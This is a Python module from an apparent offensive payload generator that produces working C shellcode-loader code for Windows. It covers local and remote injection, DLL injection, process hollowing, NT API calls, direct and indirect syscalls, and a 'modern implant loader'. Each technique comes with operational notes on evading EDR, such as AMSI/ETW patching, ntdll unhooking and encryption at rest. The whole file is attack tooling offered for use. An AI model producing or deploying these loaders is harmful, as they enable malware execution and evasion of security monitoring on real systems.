"""
techniques.py — per-technique C payload bodies.

Each generator returns a dict:
  api_names        : Win32 API names the body uses (for the dynamic-api remap)
  needs_target     : injects into a remote process (needs --process)
  needs_host       : needs a host binary path (--host, default notepad.exe)
  needs_dll        : needs a DLL path (--dll)
  needs_syscalls   : pulls in the syscall stubs (direct/indirect)
  globals          : extra C declarations emitted near the top
  main             : the C statements executed inside main() AFTER evasion.init
  note             : short opsec note appended to the generated README
"""

from . import cstubs


# Shared local types for NT-process open (OBJECT_ATTRIBUTES / CLIENT_ID)
_NT_OPEN_TYPES = r"""
typedef struct _MY_OA {
    ULONG     Length;
    HANDLE    RootDirectory;
    PWSTR     ObjectName;
    ULONG     Attributes;
    PVOID     SecurityDescriptor;
    PVOID     SecurityQualityOfService;
} MY_OA;
typedef struct _MY_CID { HANDLE UniqueProcess; HANDLE UniqueThread; } MY_CID;
"""

# pid helper is shared; declare its APIs for the dynamic-api remap when used
_PID_APIS = ["CreateToolhelp32Snapshot", "Process32FirstW", "Process32NextW"]


# --------------------------------------------------------------------------
def pe01(params):
    return dict(
        api_names=["VirtualAlloc", "CreateThread", "WaitForSingleObject"],
        needs_target=False, needs_host=False, needs_dll=False, needs_syscalls=False,
        globals="",
        main=r"""
    /* PE01 — classic local shellcode injection */
    void* mem = VirtualAlloc(NULL, (SIZE_T)sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { return 1; }
    memcpy(mem, sc, sc_len);

    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (t) { WaitForSingleObject(t, INFINITE); CloseHandle(t); }
""",
        note="Standalone RWX allocation in the current process. Heavily fingerprinted; "
             "pair with dynamic-api + rc4/xor to clear the IAT and static signatures.",
    )


def pe02(params):
    return dict(
        api_names=["OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
                   "CreateRemoteThread", "WaitForSingleObject"] + _PID_APIS,
        needs_target=True, needs_host=False, needs_dll=False, needs_syscalls=False,
        globals="",
        main=r"""
    /* PE02 — remote CreateRemoteThread injection */
    DWORD pid = pid_by_name(g_target_name);
    if (!pid) { return 2; }
    HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hp) { return 3; }

    void* mem = VirtualAllocEx(hp, NULL, (SIZE_T)sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { CloseHandle(hp); return 4; }

    SIZE_T wr = 0;
    WriteProcessMemory(hp, mem, sc, sc_len, &wr);

    HANDLE t = CreateRemoteThread(hp, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (t) { WaitForSingleObject(t, INFINITE); CloseHandle(t); }
    CloseHandle(hp);
""",
        note="CreateRemoteThread + cross-process WPM are classic EDR tripwires. Use only "
             "against legacy/lab hosts; on hardened targets prefer pe23/pe24/pe25.",
    )


def pe04(params):
    return dict(
        api_names=["VirtualAlloc", "VirtualProtect", "CreateThread", "WaitForSingleObject"],
        needs_target=False, needs_host=False, needs_dll=False, needs_syscalls=False,
        globals="",
        main=r"""
    /* PE04 — VirtualProtect RW->RX (never allocates RWX) */
    void* mem = VirtualAlloc(NULL, (SIZE_T)sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { return 1; }
    memcpy(mem, sc, sc_len);

    DWORD old = 0;
    if (!VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old)) { return 5; }

    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (t) { WaitForSingleObject(t, INFINITE); CloseHandle(t); }
""",
        note="Avoids the standalone-RWX heuristic. Still creates a private executable "
             "region — combine with module stomping (pe16) to back it with a legit module.",
    )


def pe05(params):
    return dict(
        api_names=["OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
                   "CreateRemoteThread", "WaitForSingleObject",
                   "GetModuleHandleA", "GetProcAddress"] + _PID_APIS,
        needs_target=True, needs_host=False, needs_dll=True, needs_syscalls=False,
        globals="",
        main=r"""
    /* PE05 — classic DLL injection via LoadLibrary path */
    DWORD pid = pid_by_name(g_target_name);
    if (!pid) { return 2; }
    HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hp) { return 3; }

    SIZE_T pathlen = strlen(g_dll_path) + 1;
    void* remote = VirtualAllocEx(hp, NULL, pathlen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) { CloseHandle(hp); return 4; }

    SIZE_T wr = 0;
    WriteProcessMemory(hp, remote, g_dll_path, pathlen, &wr);

    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    LPVOID loadlib = (LPVOID)GetProcAddress(k32, "LoadLibraryA");

    HANDLE t = CreateRemoteThread(hp, NULL, 0, (LPTHREAD_START_ROUTINE)loadlib, remote, 0, NULL);
    if (t) { WaitForSingleObject(t, INFINITE); CloseHandle(t); }
    CloseHandle(hp);
""",
        note="The DLL path is written into the target and the DLL must exist on disk — "
             "easily caught. Prefer reflective (pe06) or a memory-only technique.",
    )


def pe08(params):
    return dict(
        api_names=["CreateProcessA", "GetThreadContext", "SetThreadContext", "ResumeThread",
                   "ReadProcessMemory", "VirtualAllocEx", "WriteProcessMemory",
                   "GetModuleHandleA", "GetProcAddress"] + [],
        needs_target=False, needs_host=True, needs_dll=False, needs_syscalls=False,
        globals="",
        main=r"""
    /* PE08 — process hollowing */
    STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessA(NULL, (LPSTR)g_host_bin, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 6;
    }

    CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    /* x64: initial thread context holds the PEB pointer in Rdx; ImageBaseAddress @ PEB+0x10 */
    PVOID remote_peb = (PVOID)ctx.Rdx;
    PVOID old_base = NULL;
    ReadProcessMemory(pi.hProcess, (PVOID)((ULONG_PTR)remote_peb + 0x10), &old_base, sizeof(PVOID), NULL);

    /* unmap the legitimate image */
    fnNtUnmapViewOfSection pUnmap = (fnNtUnmapViewOfSection)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    if (pUnmap) pUnmap(pi.hProcess, old_base);

    /* stage shellcode in the hollowed process */
    PVOID target_mem = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!target_mem) { TerminateProcess(pi.hProcess, 0); return 7; }
    SIZE_T wr = 0;
    WriteProcessMemory(pi.hProcess, target_mem, sc, sc_len, &wr);

    /* redirect the suspended thread's entry to our shellcode */
    ctx.Rcx = (DWORD64)0;
    ctx.Rip = (DWORD64)(ULONG_PTR)target_mem;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
""",
        note="Image on disk is legitimate; memory is the lie. Strong default for stealth. "
             "Rip/hollowing is visible to kernel callbacks — pair with sleep+encryption for scanners.",
    )


def pe23(params):
    return dict(
        api_names=["GetModuleHandleA", "GetProcAddress"] + _PID_APIS,
        needs_target=True, needs_host=False, needs_dll=False, needs_syscalls=False,
        globals=_NT_OPEN_TYPES,
        main=r"""
    /* PE23 — NT (undocumented) API injection */
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    fnNtOpenProcess           pOpen  = (fnNtOpenProcess)GetProcAddress(nt, "NtOpenProcess");
    fnNtAllocateVirtualMemory pAlloc = (fnNtAllocateVirtualMemory)GetProcAddress(nt, "NtAllocateVirtualMemory");
    fnNtWriteVirtualMemory    pWrite = (fnNtWriteVirtualMemory)GetProcAddress(nt, "NtWriteVirtualMemory");
    fnNtProtectVirtualMemory  pProt  = (fnNtProtectVirtualMemory)GetProcAddress(nt, "NtProtectVirtualMemory");
    fnNtCreateThreadEx        pThr   = (fnNtCreateThreadEx)GetProcAddress(nt, "NtCreateThreadEx");
    fnNtWaitForSingleObject   pWait  = (fnNtWaitForSingleObject)GetProcAddress(nt, "NtWaitForSingleObject");
    if (!pOpen || !pAlloc || !pWrite || !pProt || !pThr) { return 8; }

    DWORD pid = pid_by_name(g_target_name);
    if (!pid) { return 2; }

    HANDLE hp = NULL;
    MY_OA oa; ZeroMemory(&oa, sizeof(oa)); oa.Length = sizeof(oa);
    MY_CID cid; cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid; cid.UniqueThread = NULL;
    pOpen(&hp, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!hp) { return 9; }

    PVOID base = NULL; SIZE_T size = sc_len;
    pAlloc(hp, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    SIZE_T wr = 0;
    pWrite(hp, base, sc, sc_len, &wr);

    ULONG oldprot = 0; SIZE_T regionsz = sc_len;
    pProt(hp, &base, &regionsz, PAGE_EXECUTE_READ, &oldprot);

    HANDLE th = NULL;
    pThr(&th, 0x1FFFFF, NULL, hp, base, NULL, FALSE, 0, 0, 0, NULL);
    if (th && pWait) pWait(th, FALSE, NULL);
    CloseHandle(hp);
""",
        note="Drops below kernel32 into ntdll. Bypasses Win32-layer monitors but ntdll stubs "
             "are still hooked by most EDRs — escalate to pe24 (direct) / pe25 (indirect) syscalls.",
    )


def _syscall_resolve_block():
    return r"""
    /* resolve syscall numbers (Hell's Gate / Halo's Gate) at runtime */
    SYSCALL_ENTRY e_open, e_alloc, e_write, e_prot, e_thr, e_wait;
    resolve_ssn("NtOpenProcess",           &e_open);
    resolve_ssn("NtAllocateVirtualMemory", &e_alloc);
    resolve_ssn("NtWriteVirtualMemory",    &e_write);
    resolve_ssn("NtProtectVirtualMemory",  &e_prot);
    resolve_ssn("NtCreateThreadEx",        &e_thr);
    resolve_ssn("NtWaitForSingleObject",   &e_wait);
    if (!e_open.ssn || !e_alloc.ssn || !e_write.ssn || !e_thr.ssn) { return 8; }
"""


def pe24(params):
    return dict(
        api_names=_PID_APIS,
        needs_target=True, needs_host=False, needs_dll=False, needs_syscalls=True,
        globals=_NT_OPEN_TYPES,
        main=_syscall_resolve_block() + r"""
    /* PE24 — direct syscalls (skip ntdll stubs entirely) */
    DWORD pid = pid_by_name(g_target_name);
    if (!pid) { return 2; }

    HANDLE hp = NULL;
    MY_OA oa; ZeroMemory(&oa, sizeof(oa)); oa.Length = sizeof(oa);
    MY_CID cid; cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid; cid.UniqueThread = NULL;
    g_ssn = e_open.ssn; DoDirectSyscall(&hp, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!hp) { return 9; }

    PVOID base = NULL; SIZE_T size = sc_len;
    g_ssn = e_alloc.ssn; DoDirectSyscall(hp, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    SIZE_T wr = 0;
    g_ssn = e_write.ssn; DoDirectSyscall(hp, base, sc, sc_len, &wr);

    ULONG oldprot = 0; SIZE_T regionsz = sc_len;
    g_ssn = e_prot.ssn; DoDirectSyscall(hp, &base, &regionsz, PAGE_EXECUTE_READ, &oldprot);

    HANDLE th = NULL;
    g_ssn = e_thr.ssn; DoDirectSyscall(&th, 0x1FFFFF, NULL, hp, base, NULL, FALSE, 0, 0, 0, NULL);
    g_ssn = e_wait.ssn; DoDirectSyscall(th, FALSE, NULL);
    CloseHandle(hp);
""",
        note="Bypasses every userland hook — but the 'syscall from non-ntdll memory' return "
             "address is itself a detection. Indirect syscalls (pe25) close that gap.",
    )


def pe25(params):
    return dict(
        api_names=_PID_APIS,
        needs_target=True, needs_host=False, needs_dll=False, needs_syscalls=True,
        globals=_NT_OPEN_TYPES,
        main=_syscall_resolve_block() + r"""
    /* PE25 — indirect syscalls (transition originates inside ntdll) */
    g_syscall_addr = e_open.gadget;   /* `syscall; ret` gadget located inside ntdll */

    DWORD pid = pid_by_name(g_target_name);
    if (!pid) { return 2; }

    HANDLE hp = NULL;
    MY_OA oa; ZeroMemory(&oa, sizeof(oa)); oa.Length = sizeof(oa);
    MY_CID cid; cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid; cid.UniqueThread = NULL;
    g_ssn = e_open.ssn; DoIndirectSyscall(&hp, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!hp) { return 9; }

    PVOID base = NULL; SIZE_T size = sc_len;
    g_ssn = e_alloc.ssn; DoIndirectSyscall(hp, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    SIZE_T wr = 0;
    g_ssn = e_write.ssn; DoIndirectSyscall(hp, base, sc, sc_len, &wr);

    ULONG oldprot = 0; SIZE_T regionsz = sc_len;
    g_ssn = e_prot.ssn; DoIndirectSyscall(hp, &base, &regionsz, PAGE_EXECUTE_READ, &oldprot);

    HANDLE th = NULL;
    g_ssn = e_thr.ssn; DoIndirectSyscall(&th, 0x1FFFFF, NULL, hp, base, NULL, FALSE, 0, 0, 0, NULL);
    g_ssn = e_wait.ssn; DoIndirectSyscall(th, FALSE, NULL);
    CloseHandle(hp);
""",
        note="Strongest userland evasion in the series. Still observable via kernel callbacks "
             "(ETW Threat-Intelligence, minifilters, object-notify) — combine with sleep + encryption.",
    )


IMPLEMENTED = {
    "pe01": pe01,
    "pe02": pe02,
    # pe03 / pe17 are documented aliases: pe02 flow with the dynamic-api layer.
    # cmd_generate forces -e dynamic-api for them so they build out of the box.
    "pe03": pe02,
    "pe04": pe04,
    "pe05": pe05,
    "pe08": pe08,
    "pe17": pe02,
    "pe23": pe23,
    "pe24": pe24,
    "pe25": pe25,
    "pe26": None,  # modern implant — registered below (defined after IMPLEMENTED)
}


def pe26(params):
    """Modern implant loader: decrypt-at-rest -> stage (stomp/alloc) -> execute (callback/thread).

    Composes the evasion stack rather than a single injection primitive. The
    evasion.init block (emitted by payload.py) handles decryption/patching; this
    body only stages the now-plaintext payload and invokes it.
    """
    return dict(
        api_names=[],
        needs_target=False, needs_host=False, needs_dll=False, needs_syscalls=False,
        globals="",
        main=r"""
    /* PE26 — modern implant loader
     *   evasion.init already: resolved APIs (dynamic-api), decrypted sc[] (aes/rc4/xor),
     *   patched AMSI/ETW, unhooked ntdll. Now stage + execute. */
    void* exec = SHROUD_STAGE(sc, sc_len);
    if (!exec) { return 10; }
    SHROUD_RUN(exec);
""",
        note="Purpose-built implant: AES-at-rest + (optional) module stomping for backed "
             "memory + callback execution to dodge thread-creation telemetry, on top of "
             "dynamic-api/FNV, AMSI/ETW patching and KnownDlls unhooking. This is the "
             "loader to throw at a modern EDR — combine layers freely.",
    )


# resolve the pe26 forward reference
IMPLEMENTED["pe26"] = pe26


def scaffold(tech):
    """Return a documented stub project body for techniques not yet implemented."""
    flow = "\n".join(f" *   {i+1}. {s}" for i, s in enumerate(tech["flow"]))
    return dict(
        api_names=[],
        needs_target=False, needs_host=False, needs_dll=False, needs_syscalls=False,
        globals="",
        main=f"""
    /*
     * {tech['id'].upper()} — {tech['name']}  [{tech['subtech']}]
     * -----------------------------------------------------------------------
     * This technique is registered but not yet code-generated by shroud.
     * A working starter is below; complete the flow, then move it into
     * lib/techniques.py IMPLEMENTED[] so `generate` builds it directly.
     *
     * Intended flow:
{flow}
     *
     * References:
     *   {tech['name']} — Offensive-Panda Process Injection Series
     *   MITRE ATT&CK {tech['subtech']}
     *
     * The staged shellcode is available here as `sc` / `sc_len`, already
     * decrypted if an encryption evasion layer was applied.
     */

    /* TODO: implement {tech['name']} */
    (void)sc; (void)sc_len;
    return 0;
""",
        note=f"Scaffold for {tech['id']} — complete the flow in the generated main.c.",
    )


def build(tech, params):
    if tech["id"] in IMPLEMENTED:
        return IMPLEMENTED[tech["id"]](params)
    return scaffold(tech)
